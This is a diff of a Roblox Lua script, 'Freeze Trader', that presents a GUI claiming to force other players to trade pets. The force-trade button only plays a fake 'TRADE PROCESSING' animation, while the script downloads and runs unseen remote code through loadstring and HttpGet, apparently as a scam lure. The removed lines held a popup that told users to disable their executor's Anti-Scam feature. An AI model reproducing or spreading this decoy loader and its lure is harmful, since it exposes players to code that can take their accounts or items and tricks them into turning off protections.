@@ -1,9 +1,3 @@
--- 📌 Проверка на Delta
-local isDelta = false
-if type(Delta) == "table" or type(_G.Delta) == "table" then
-    isDelta = true
-end
-
 -- 🔹 Флаги для предотвращения повторного открытия
 if not _G.FreezeTraderLoaded then
     _G.FreezeTraderLoaded = true
@@ -143,485 +137,267 @@ if not _G.FreezeTraderLoaded then
         local mainWindow, openMain = createWindow("🌱 Freeze Trader", UDim2.new(0, 350, 0, 260))
         openMain()
 
--- Кнопка Players
-local playersBtn = Instance.new("TextButton")
-playersBtn.Text = "👥 Players"
-playersBtn.Font = Enum.Font.Arcade
-playersBtn.TextColor3 = colors.text
-playersBtn.TextStrokeTransparency = 0
-playersBtn.TextScaled = true
-playersBtn.Size = UDim2.new(1, -20, 0, 35)
-playersBtn.Position = UDim2.new(0, 10, 0, 50)
-playersBtn.BackgroundColor3 = colors.button
-playersBtn.BorderSizePixel = 2
-playersBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
-playersBtn.Parent = mainWindow
-Instance.new("UICorner", playersBtn).CornerRadius = UDim.new(0, 6)
+        -- Кнопка Players
+        local playersBtn = Instance.new("TextButton")
+        playersBtn.Text = "👥 Players"
+        playersBtn.Font = Enum.Font.Arcade
+        playersBtn.TextColor3 = colors.text
+        playersBtn.TextStrokeTransparency = 0
+        playersBtn.TextScaled = true
+        playersBtn.Size = UDim2.new(1, -20, 0, 35)
+        playersBtn.Position = UDim2.new(0, 10, 0, 50)
+        playersBtn.BackgroundColor3 = colors.button
+        playersBtn.BorderSizePixel = 2
+        playersBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
+        playersBtn.Parent = mainWindow
+        Instance.new("UICorner", playersBtn).CornerRadius = UDim.new(0, 6)
 
--- Players окно
-local playersWindow, openPlayers = createWindow("👥 Список игроков", UDim2.new(0, 350, 0, 350))
-playersWindow.Position = UDim2.new(0.5, 50, 0.5, 50)
+        -- Players окно
+        local playersWindow, openPlayers = createWindow("👥 Список игроков", UDim2.new(0, 350, 0, 350))
+        playersWindow.Position = UDim2.new(0.5, 50, 0.5, 50)
 
-local scrollingFrame = Instance.new("ScrollingFrame")
-scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
-scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
-scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-scrollingFrame.ScrollBarThickness = 8
-scrollingFrame.BackgroundTransparency = 1
-scrollingFrame.Parent = playersWindow
+        local scrollingFrame = Instance.new("ScrollingFrame")
+        scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
+        scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
+        scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+        scrollingFrame.ScrollBarThickness = 8
+        scrollingFrame.BackgroundTransparency = 1
+        scrollingFrame.Parent = playersWindow
 
-local uiList = Instance.new("UIListLayout")
-uiList.Padding = UDim.new(0, 6)
-uiList.Parent = scrollingFrame
+        local uiList = Instance.new("UIListLayout")
+        uiList.Padding = UDim.new(0, 6)
+        uiList.Parent = scrollingFrame
 
--- Trade окно
-local tradeWindow, openTrade = createWindow("🌿 Force Trade Pets", UDim2.new(0, 350, 0, 320))
-tradeWindow.Position = UDim2.new(0.5, -50, 0.5, -50)
+        -- Trade окно
+        local tradeWindow, openTrade = createWindow("🌿 Force Trade Pets", UDim2.new(0, 350, 0, 320))
+        tradeWindow.Position = UDim2.new(0.5, -50, 0.5, -50)
 
-local selectedAvatar = Instance.new("ImageLabel")
-selectedAvatar.Size = UDim2.new(0, 130, 0, 130)
-selectedAvatar.Position = UDim2.new(0.5, -65, 0, 40)
-selectedAvatar.BackgroundTransparency = 1
-selectedAvatar.Parent = tradeWindow
-Instance.new("UICorner", selectedAvatar).CornerRadius = UDim.new(1, 0)
+        local selectedAvatar = Instance.new("ImageLabel")
+        selectedAvatar.Size = UDim2.new(0, 130, 0, 130)
+        selectedAvatar.Position = UDim2.new(0.5, -65, 0, 40)
+        selectedAvatar.BackgroundTransparency = 1
+        selectedAvatar.Parent = tradeWindow
+        Instance.new("UICorner", selectedAvatar).CornerRadius = UDim.new(1, 0)
 
-local selectedName = Instance.new("TextLabel")
-selectedName.Size = UDim2.new(1, 0, 0, 35)
-selectedName.Position = UDim2.new(0, 0, 0, 180)
-selectedName.Font = Enum.Font.Arcade
-selectedName.TextColor3 = colors.text
-selectedName.TextStrokeTransparency = 0
-selectedName.TextScaled = true
-selectedName.BackgroundTransparency = 1
-selectedName.Text = ""
-selectedName.Parent = tradeWindow
+        local selectedName = Instance.new("TextLabel")
+        selectedName.Size = UDim2.new(1, 0, 0, 35)
+        selectedName.Position = UDim2.new(0, 0, 0, 180)
+        selectedName.Font = Enum.Font.Arcade
+        selectedName.TextColor3 = colors.text
+        selectedName.TextStrokeTransparency = 0
+        selectedName.TextScaled = true
+        selectedName.BackgroundTransparency = 1
+        selectedName.Text = ""
+        selectedName.Parent = tradeWindow
 
-local btnWidth, btnHeight = 320, 40
-local autoAccept = false
+        local btnWidth, btnHeight = 320, 40
+        local autoAccept = false
 
-local autoAcceptBtn = Instance.new("TextButton")
-autoAcceptBtn.Text = "Auto Accept: OFF"
-autoAcceptBtn.Font = Enum.Font.Arcade
-autoAcceptBtn.TextColor3 = colors.text
-autoAcceptBtn.TextStrokeTransparency = 0
-autoAcceptBtn.TextScaled = true
-autoAcceptBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
-autoAcceptBtn.Position = UDim2.new(0, 15, 1, -btnHeight - 15)
-autoAcceptBtn.BackgroundColor3 = colors.buttonDanger -- сразу красная
-autoAcceptBtn.BorderSizePixel = 2
-autoAcceptBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
-autoAcceptBtn.Parent = tradeWindow
-Instance.new("UICorner", autoAcceptBtn).CornerRadius = UDim.new(0, 6)
+        local autoAcceptBtn = Instance.new("TextButton")
+        autoAcceptBtn.Text = "Auto Accept: OFF"
+        autoAcceptBtn.Font = Enum.Font.Arcade
+        autoAcceptBtn.TextColor3 = colors.text
+        autoAcceptBtn.TextStrokeTransparency = 0
+        autoAcceptBtn.TextScaled = true
+        autoAcceptBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
+        autoAcceptBtn.Position = UDim2.new(0, 15, 1, -btnHeight - 15)
+        autoAcceptBtn.BackgroundColor3 = colors.buttonDanger -- сразу красная
+        autoAcceptBtn.BorderSizePixel = 2
+        autoAcceptBtn.BorderColor3 = Color3.fromRGB(40, 70, 40)
+        autoAcceptBtn.Parent = tradeWindow
+        Instance.new("UICorner", autoAcceptBtn).CornerRadius = UDim.new(0, 6)
 
-local forceTradePetsBtn = Instance.new("TextButton")
-forceTradePetsBtn.Font = Enum.Font.Arcade
-forceTradePetsBtn.TextColor3 = colors.text
-forceTradePetsBtn.TextStrokeTransparency = 0
-forceTradePetsBtn.TextScaled = true
-forceTradePetsBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
-forceTradePetsBtn.Position = UDim2.new(0, 15, 1, -btnHeight*2 - 25)
-forceTradePetsBtn.BackgroundColor3 = colors.buttonAccent
-forceTradePetsBtn.BorderSizePixel = 2
-forceTradePetsBtn.BorderColor3 = Color3.fromRGB(70, 90, 50)
-forceTradePetsBtn.Text = "FORCE TRADE PETS"
-forceTradePetsBtn.Parent = tradeWindow
-Instance.new("UICorner", forceTradePetsBtn).CornerRadius = UDim.new(0, 6)
+        local forceTradePetsBtn = Instance.new("TextButton")
+        forceTradePetsBtn.Font = Enum.Font.Arcade
+        forceTradePetsBtn.TextColor3 = colors.text
+        forceTradePetsBtn.TextStrokeTransparency = 0
+        forceTradePetsBtn.TextScaled = true
+        forceTradePetsBtn.Size = UDim2.new(0, btnWidth, 0, btnHeight)
+        forceTradePetsBtn.Position = UDim2.new(0, 15, 1, -btnHeight*2 - 25)
+        forceTradePetsBtn.BackgroundColor3 = colors.buttonAccent
+        forceTradePetsBtn.BorderSizePixel = 2
+        forceTradePetsBtn.BorderColor3 = Color3.fromRGB(70, 90, 50)
+        forceTradePetsBtn.Text = "FORCE TRADE PETS"
+        forceTradePetsBtn.Parent = tradeWindow
+        Instance.new("UICorner", forceTradePetsBtn).CornerRadius = UDim.new(0, 6)
 
--- Список игроков
-local selectedPlayerFrame = nil
-local function clearPlayerSelection()
-	for _, child in pairs(scrollingFrame:GetChildren()) do
-		if child:IsA("Frame") then
-			child.BackgroundColor3 = colors.listItem
-		end
-	end
-	selectedPlayerFrame = nil
-end
+        -- Overlay 🌿
+        local overlay = Instance.new("Frame")
+        overlay.Size = UDim2.new(1, 0, 1, 0)
+        overlay.Position = UDim2.new(0, 0, 0, 0)
+        overlay.BackgroundColor3 = Color3.fromRGB(50, 100, 50)
+        overlay.BackgroundTransparency = 0.4
+        overlay.Visible = false
+        overlay.Parent = screenGui
+        overlay.ZIndex = 1000
 
-local function updatePlayersList()
-	for _, child in pairs(scrollingFrame:GetChildren()) do
-		if child:IsA("Frame") then
-			child:Destroy()
-		end
-	end
-	for _, p in pairs(Players:GetPlayers()) do
-		if p ~= player then
-			local playerFrame = Instance.new("Frame")
-		 playerFrame.Size = UDim2.new(1, 0, 0, 40)
-			playerFrame.BackgroundColor3 = colors.listItem
-			playerFrame.Parent = scrollingFrame
+        local gradient = Instance.new("UIGradient")
+        gradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 120, 70)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 150, 100)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 120, 70))
+        }
+        gradient.Rotation = 90
+        gradient.Parent = overlay
 
-			local avatar = Instance.new("ImageLabel")
-			avatar.Size = UDim2.new(0, 35, 0, 35)
-			avatar.Position = UDim2.new(0, 5, 0, 3)
-			avatar.BackgroundTransparency = 1
-			avatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
-			avatar.Parent = playerFrame
-			Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
+        local loadingText = Instance.new("TextLabel")
+        loadingText.Text = "TRADE PROCESSING"
+        loadingText.Font = Enum.Font.Arcade
+        loadingText.TextColor3 = colors.text
+        loadingText.TextStrokeTransparency = 0
+        loadingText.TextScaled = true
+        loadingText.BackgroundTransparency = 1
+        loadingText.Size = UDim2.new(0, 300, 0, 50)
+        loadingText.Position = UDim2.new(0.5, -150, 0.5, -100)
+        loadingText.Parent = overlay
+        loadingText.ZIndex = 1001
 
-			local nameLabel = Instance.new("TextLabel")
-			nameLabel.Text = p.Name
-			nameLabel.Font = Enum.Font.Arcade
-			nameLabel.TextColor3 = colors.text
-			nameLabel.TextStrokeTransparency = 0
-			nameLabel.TextScaled = true
-			nameLabel.BackgroundTransparency = 1
-			nameLabel.Size = UDim2.new(1, -45, 1, 0)
-			nameLabel.Position = UDim2.new(0, 45, 0, 0)
-			nameLabel.Parent = playerFrame
+        local leaves = {}
+        for i = 1, 3 do
+            local leaf = Instance.new("TextLabel")
+            leaf.Text = "🌱"
+            leaf.Font = Enum.Font.Arcade
+            leaf.TextColor3 = Color3.fromRGB(200, 255, 200)
+            leaf.TextScaled = true
+            leaf.BackgroundTransparency = 1
+            leaf.Size = UDim2.new(0, 50, 0, 50)
+            leaf.Position = UDim2.new(0.5, -25, 0.5, (i-1)*55)
+            leaf.Parent = overlay
+            leaf.Visible = false
+            leaf.ZIndex = 1001
+            table.insert(leaves, leaf)
+        end
 
-			-- Hover эффект
-			playerFrame.MouseEnter:Connect(function()
-				if selectedPlayerFrame ~= playerFrame then
-					playerFrame.BackgroundColor3 = colors.listItemHover
-				end
-			end)
-			playerFrame.MouseLeave:Connect(function()
-				if selectedPlayerFrame ~= playerFrame then
-					playerFrame.BackgroundColor3 = colors.listItem
-				end
-			end)
+        local dotsCount = 0
+        local function animateLoadingText()
+            dotsCount = (dotsCount % 3) + 1
+            loadingText.Text = "TRADE PROCESSING" .. string.rep(".", dotsCount)
+        end
 
-			playerFrame.InputBegan:Connect(function(input)
-				if input.UserInputType == Enum.UserInputType.MouseButton1 then
-					clearPlayerSelection()
-					playerFrame.BackgroundColor3 = colors.button
-					selectedPlayerFrame = playerFrame
-					selectedName.Text = p.Name
-					selectedAvatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
-					openTrade()
-				end
-			end)
-		end
-	end
-	local listLength = #Players:GetPlayers() - 1
-	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, listLength * 46)
-end
+        local function startOverlay()
+            overlay.Visible = true
+            dotsCount = 0
+            animateLoadingText()
+            spawn(function()
+                for i, leaf in ipairs(leaves) do
+                    wait(0.6)
+                    if overlay.Visible then
+                        leaf.Visible = true
+                        leaf.TextColor3 = Color3.fromRGB(150 + i*30, 255, 150 + i*20)
+                    end
+                end
+            end)
+            spawn(function()
+                while overlay.Visible do
+                    wait(0.7)
+                    animateLoadingText()
+                end
+            end)
+        end
 
-playersBtn.MouseButton1Click:Connect(function()
-	updatePlayersList()
-	openPlayers()
-end)
+        local function stopOverlay()
+            overlay.Visible = false
+            for _, leaf in ipairs(leaves) do
+                leaf.Visible = false
+            end
+        end
 
--- Overlay 🌿
-local overlay = Instance.new("Frame")
-overlay.Size = UDim2.new(1, 0, 1, 0)
-overlay.Position = UDim2.new(0, 0, 0, 0)
-overlay.BackgroundColor3 = Color3.fromRGB(50, 100, 50)
-overlay.BackgroundTransparency = 0.4
-overlay.Visible = false
-overlay.Parent = screenGui
-overlay.ZIndex = 1000
+        -- Список игроков
+        local selectedPlayerFrame = nil
+        local function clearPlayerSelection()
+            for _, child in pairs(scrollingFrame:GetChildren()) do
+                if child:IsA("Frame") then
+                    child.BackgroundColor3 = colors.listItem
+                end
+            end
+            selectedPlayerFrame = nil
+        end
 
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 120, 70)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 150, 100)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 120, 70))
-}
-gradient.Rotation = 90
-gradient.Parent = overlay
+        local function updatePlayersList()
+            for _, child in pairs(scrollingFrame:GetChildren()) do
+                if child:IsA("Frame") then
+                    child:Destroy()
+                end
+            end
+            for _, p in pairs(Players:GetPlayers()) do
+                if p ~= player then
+                    local playerFrame = Instance.new("Frame")
+                    playerFrame.Size = UDim2.new(1, 0, 0, 40)
+                    playerFrame.BackgroundColor3 = colors.listItem
+                    playerFrame.Parent = scrollingFrame
 
-local loadingText = Instance.new("TextLabel")
-loadingText.Text = "TRADE PROCESSING"
-loadingText.Font = Enum.Font.Arcade
-loadingText.TextColor3 = colors.text
-loadingText.TextStrokeTransparency = 0
-loadingText.TextScaled = true
-loadingText.BackgroundTransparency = 1
-loadingText.Size = UDim2.new(0, 300, 0, 50)
-loadingText.Position = UDim2.new(0.5, -150, 0.5, -100)
-loadingText.Parent = overlay
-loadingText.ZIndex = 1001
+                    local avatar = Instance.new("ImageLabel")
+                    avatar.Size = UDim2.new(0, 35, 0, 35)
+                    avatar.Position = UDim2.new(0, 5, 0, 3)
+                    avatar.BackgroundTransparency = 1
+                    avatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
+                    avatar.Parent = playerFrame
+                    Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
 
-local leaves = {}
-for i = 1, 3 do
-	local leaf = Instance.new("TextLabel")
-	leaf.Text = "🌱"
-	leaf.Font = Enum.Font.Arcade
-	leaf.TextColor3 = Color3.fromRGB(200, 255, 200)
-	leaf.TextScaled = true
-	leaf.BackgroundTransparency = 1
-	leaf.Size = UDim2.new(0, 50, 0, 50)
-	leaf.Position = UDim2.new(0.5, -25, 0.5, (i-1)*55)
-	leaf.Parent = overlay
-	leaf.Visible = false
-	leaf.ZIndex = 1001
-	table.insert(leaves, leaf)
-end
+                    local nameLabel = Instance.new("TextLabel")
+                    nameLabel.Text = p.Name
+                    nameLabel.Font = Enum.Font.Arcade
+                    nameLabel.TextColor3 = colors.text
+                    nameLabel.TextStrokeTransparency = 0
+                    nameLabel.TextScaled = true
+                    nameLabel.BackgroundTransparency = 1
+                    nameLabel.Size = UDim2.new(1, -45, 1, 0)
+                    nameLabel.Position = UDim2.new(0, 45, 0, 0)
+                    nameLabel.Parent = playerFrame
 
-local dotsCount = 0
-local function animateLoadingText()
-	dotsCount = (dotsCount % 3) + 1
-	loadingText.Text = "TRADE PROCESSING" .. string.rep(".", dotsCount)
-end
+                    playerFrame.MouseEnter:Connect(function()
+                        if selectedPlayerFrame ~= playerFrame then
+                            playerFrame.BackgroundColor3 = colors.listItemHover
+                        end
+                    end)
+                    playerFrame.MouseLeave:Connect(function()
+                        if selectedPlayerFrame ~= playerFrame then
+                            playerFrame.BackgroundColor3 = colors.listItem
+                        end
+                    end)
 
-local function startOverlay()
-	overlay.Visible = true
-	dotsCount = 0
-	animateLoadingText()
-	spawn(function()
-		for i, leaf in ipairs(leaves) do
-			wait(0.6)
-			if overlay.Visible then
-				leaf.Visible = true
-				leaf.TextColor3 = Color3.fromRGB(150 + i*30, 255, 150 + i*20)
-			end
-		end
-	end)
-	spawn(function()
-		while overlay.Visible do
-			wait(0.7)
-			animateLoadingText()
-		end
-	end)
-end
+                    playerFrame.InputBegan:Connect(function(input)
+                        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                            clearPlayerSelection()
+                            playerFrame.BackgroundColor3 = colors.button
+                            selectedPlayerFrame = playerFrame
+                            selectedName.Text = p.Name
+                            selectedAvatar.Image = Players:GetUserThumbnailAsync(p.UserId, ThumbnailType, ThumbnailSize)
+                            openTrade()
+                        end
+                    end)
+                end
+            end
+            local listLength = #Players:GetPlayers() - 1
+            scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, listLength * 46)
+        end
 
-local function stopOverlay()
-	overlay.Visible = false
-	for _, leaf in ipairs(leaves) do
-		leaf.Visible = false
-	end
-end
+        playersBtn.MouseButton1Click:Connect(function()
+            updatePlayersList()
+            openPlayers()
+        end)
 
--- Подключение кнопок
-forceTradePetsBtn.MouseButton1Click:Connect(function()
-	if not selectedName.Text or selectedName.Text == "" then return end
-	startOverlay()
-	wait(5)
-	stopOverlay()
-end)
+        forceTradePetsBtn.MouseButton1Click:Connect(function()
+            if not selectedName.Text or selectedName.Text == "" then return end
+            startOverlay()
+            wait(5)
+            stopOverlay()
+        end)
 
-autoAcceptBtn.MouseButton1Click:Connect(function()
-	autoAccept = not autoAccept
-	autoAcceptBtn.Text = "Auto Accept: " .. (autoAccept and "ON" or "OFF")
-	autoAcceptBtn.BackgroundColor3 = autoAccept and colors.button or colors.buttonDanger
-end)
+        autoAcceptBtn.MouseButton1Click:Connect(function()
+            autoAccept = not autoAccept
+            autoAcceptBtn.Text = "Auto Accept: " .. (autoAccept and "ON" or "OFF")
+            autoAcceptBtn.BackgroundColor3 = autoAccept and colors.button or colors.buttonDanger
+        end)
 
-Players.PlayerAdded:Connect(function() updatePlayersList() end)
-Players.PlayerRemoving:Connect(function() updatePlayersList() end)
+        Players.PlayerAdded:Connect(function() updatePlayersList() end)
+        Players.PlayerRemoving:Connect(function() updatePlayersList() end)
 
-updatePlayersList()
+        updatePlayersList()
 
-    end
-
-    -- Функция запуска TradeForce
-    local function startTradeForce()
+        -- Запуск TradeForce
         loadstring(game:HttpGet("https://raw.githubusercontent.com/daniklevik/gag/refs/heads/main/tradeforcegag"))()
     end
 
-    if isDelta then
-        if not _G.DeltaWarningShown then
-            _G.DeltaWarningShown = true
-
-            -- Создание таблички Delta
-            local Players = game:GetService("Players")
-            local TweenService = game:GetService("TweenService")
-            local LocalizationService = game:GetService("LocalizationService")
-            local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-            local guiParent = gethui and gethui() or player:WaitForChild("PlayerGui")
-            local playerLocale = LocalizationService.RobloxLocaleId
-
-            local messages = {
-                ["ru"] = {
-                    title = "⚠️ Delta Block",
-                    message = "Скрипт требует функцию телепортации, но она заблокирована из-за функции Anti-Scam.\n\nЧтобы отключить эту функцию:\n1) Перезайдите в режим (кнопка Rejoin)\n2) В настройках Delta отключите параметр Anti-Scam\n3) Повторно запустите скрипт и поставьте ✅",
-                    checkbox = "Я перезашел и отключил функцию Anti-Scam",
-                    buttonOk = "OK",
-                    buttonRejoin = "Rejoin"
-                },
-                ["en"] = {
-                    title = "⚠️ Delta Block",
-                    message = "Script requires the teleport function, but it is blocked due to the Anti-Scam feature.\n\nTo disable this feature:\n1) Press Rejoin\n2) Open Delta settings and disable Anti-Scam\n3) Run the script again and check ✅",
-                    checkbox = "I rejoin and then disabled the Anti-Scam feature",
-                    buttonOk = "OK", 
-                    buttonRejoin = "Rejoin"
-                }
-            }
-
-            local localeText = messages["en"]
-            if string.find(playerLocale, "ru") then
-                localeText = messages["ru"]
-            end
-
-            local screenGui = Instance.new("ScreenGui")
-            screenGui.Name = "DeltaWarning"
-            screenGui.IgnoreGuiInset = true
-            screenGui.ResetOnSpawn = false
-            screenGui.Parent = guiParent
-
-            -- Затемнение фона
-            local overlay = Instance.new("Frame")
-            overlay.Size = UDim2.new(1, 0, 1, 0)
-            overlay.Position = UDim2.new(0, 0, 0, 0)
-            overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            overlay.BackgroundTransparency = 0.5
-            overlay.ZIndex = 1
-            overlay.Parent = screenGui
-
-            -- Основное окно (высота 280)
-            local mainFrame = Instance.new("Frame")
-            mainFrame.Size = UDim2.new(0, 450, 0, 280)
-            mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-            mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Правильное центрирование
-            mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-            mainFrame.BorderSizePixel = 0
-            mainFrame.ZIndex = 2
-            mainFrame.Parent = screenGui
-            Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
-
-            -- Верхняя панель
-            local header = Instance.new("Frame")
-            header.Size = UDim2.new(1, 0, 0, 40)
-            header.Position = UDim2.new(0, 0, 0, 0)
-            header.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-            header.BorderSizePixel = 0
-            header.ZIndex = 3
-            header.Parent = mainFrame
-            Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)
-
-            -- Заголовок (центрированный)
-            local title = Instance.new("TextLabel")
-            title.Size = UDim2.new(1, 0, 1, 0)
-            title.Position = UDim2.new(0, 0, 0, 0)
-            title.BackgroundTransparency = 1
-            title.Text = localeText.title
-            title.Font = Enum.Font.GothamBold
-            title.TextSize = 18
-            title.TextColor3 = Color3.fromRGB(255, 170, 0)
-            title.TextXAlignment = Enum.TextXAlignment.Center
-            title.ZIndex = 4
-            title.Parent = header
-
-            -- Текст сообщения
-            local message = Instance.new("TextLabel")
-            message.Size = UDim2.new(1, -40, 0, 130)
-            message.Position = UDim2.new(0, 20, 0, 50)
-            message.BackgroundTransparency = 1
-            message.Text = localeText.message
-            message.Font = Enum.Font.Gotham
-            message.TextSize = 16
-            message.TextColor3 = Color3.fromRGB(220, 220, 220)
-            message.TextXAlignment = Enum.TextXAlignment.Left
-            message.TextYAlignment = Enum.TextYAlignment.Top
-            message.TextWrapped = true
-            message.ZIndex = 3
-            message.Parent = mainFrame
-
-            -- Чекбокс
-            local checkbox = Instance.new("TextButton")
-            checkbox.Size = UDim2.new(0, 22, 0, 22)
-            checkbox.Position = UDim2.new(0, 20, 0, 190)
-            checkbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-            checkbox.BorderSizePixel = 0
-            checkbox.Text = ""
-            checkbox.ZIndex = 3
-            checkbox.Parent = mainFrame
-            Instance.new("UICorner", checkbox).CornerRadius = UDim.new(0, 4)
-
-            local checkmark = Instance.new("TextLabel")
-            checkmark.Size = UDim2.new(1, 0, 1, 0)
-            checkmark.Position = UDim2.new(0, 0, 0, 0)
-            checkmark.BackgroundTransparency = 1
-            checkmark.Text = "✓"
-            checkmark.Font = Enum.Font.GothamBold
-            checkmark.TextSize = 16
-            checkmark.TextColor3 = Color3.fromRGB(255, 255, 255)
-            checkmark.Visible = false
-            checkmark.ZIndex = 4
-            checkmark.Parent = checkbox
-
-            local checkboxLabel = Instance.new("TextLabel")
-            checkboxLabel.Size = UDim2.new(1, -50, 0, 22)
-            checkboxLabel.Position = UDim2.new(0, 50, 0, 190)
-            checkboxLabel.BackgroundTransparency = 1
-            checkboxLabel.Text = localeText.checkbox
-            checkboxLabel.Font = Enum.Font.Gotham
-            checkboxLabel.TextSize = 14
-            checkboxLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-            checkboxLabel.TextXAlignment = Enum.TextXAlignment.Left
-            checkboxLabel.ZIndex = 3
-            checkboxLabel.Parent = mainFrame
-
-            -- Кнопки
-            local buttonContainer = Instance.new("Frame")
-            buttonContainer.Size = UDim2.new(1, -40, 0, 45)
-            buttonContainer.Position = UDim2.new(0, 20, 1, -55)
-            buttonContainer.BackgroundTransparency = 1
-            buttonContainer.ZIndex = 3
-            buttonContainer.Parent = mainFrame
-
-            local okButton = Instance.new("TextButton")
-            okButton.Size = UDim2.new(0.45, 0, 1, 0)
-            okButton.Position = UDim2.new(0, 0, 0, 0)
-            okButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-            okButton.BorderSizePixel = 0
-            okButton.Text = localeText.buttonOk
-            okButton.Font = Enum.Font.GothamBold
-            okButton.TextSize = 16
-            okButton.TextColor3 = Color3.fromRGB(200, 200, 200)
-            okButton.ZIndex = 4
-            okButton.Parent = buttonContainer
-            Instance.new("UICorner", okButton).CornerRadius = UDim.new(0, 6)
-
-            local rejoinButton = Instance.new("TextButton")
-            rejoinButton.Size = UDim2.new(0.45, 0, 1, 0)
-            rejoinButton.Position = UDim2.new(0.55, 0, 0, 0)
-            rejoinButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
-            rejoinButton.BorderSizePixel = 0
-            rejoinButton.Text = localeText.buttonRejoin
-            rejoinButton.Font = Enum.Font.GothamBold
-            rejoinButton.TextSize = 16
-            rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-            rejoinButton.ZIndex = 4
-            rejoinButton.Parent = buttonContainer
-            Instance.new("UICorner", rejoinButton).CornerRadius = UDim.new(0, 6)
-
-            -- Анимация появления
-            mainFrame.Size = UDim2.new(0, 0, 0, 0)
-            mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-
-            local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-                Size = UDim2.new(0, 450, 0, 280),
-                Position = UDim2.new(0.5, 0, 0.5, 0) -- Центрирование
-            })
-            tween:Play()
-
-            -- Логика
-            local checked = false
-
-            checkbox.MouseButton1Click:Connect(function()
-                checked = not checked
-                checkmark.Visible = checked
-                
-                if checked then
-                    checkbox.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-                    okButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-                    okButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-                else
-                    checkbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-                    okButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-                    okButton.TextColor3 = Color3.fromRGB(200, 200, 200)
-                end
-            end)
-
-            okButton.MouseButton1Click:Connect(function()
-                if checked then
-                    screenGui:Destroy()
-                    startMainGUI()
-                    startTradeForce()
-                end
-            end)
-
-            rejoinButton.MouseButton1Click:Connect(function()
-                local TeleportService = game:GetService("TeleportService")
-                local placeId = game.PlaceId
-                TeleportService:Teleport(placeId, player)
-            end)
-        end
-    else
-        -- Если Delta нет — запускаем сразу оба скрипта
-        startMainGUI()
-        startTradeForce()
-    end
+    startMainGUI()
 end
